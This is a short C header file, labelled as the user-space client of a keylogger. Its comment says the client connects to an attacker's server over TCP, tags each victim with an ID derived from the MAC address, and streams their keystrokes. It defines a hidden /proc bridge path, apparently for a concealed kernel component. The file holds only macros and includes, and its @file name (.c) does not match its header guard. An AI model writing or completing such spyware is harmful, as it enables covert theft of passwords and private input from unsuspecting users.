/**
 * @file badclient.c
 * @brief User space client for the keylogger
 *
 * Connects to the attacker server TCP connection,
 * generates a unique victim ID based on
 * the MAC address, and streams keystrokes
 *
 */

#ifndef BADCLIENT_H
#define BADCLIENT_H

#include <stddef.h>
#include <openssl/sha.h>

#define SYSFS_PATH 256
#define PROC_FILE "/proc/hidden_bridge"
#define BUF_SIZE 1024
#define EXTRAS_LEN 3 + 1 + 1

#endif /* BADCLIENT_H */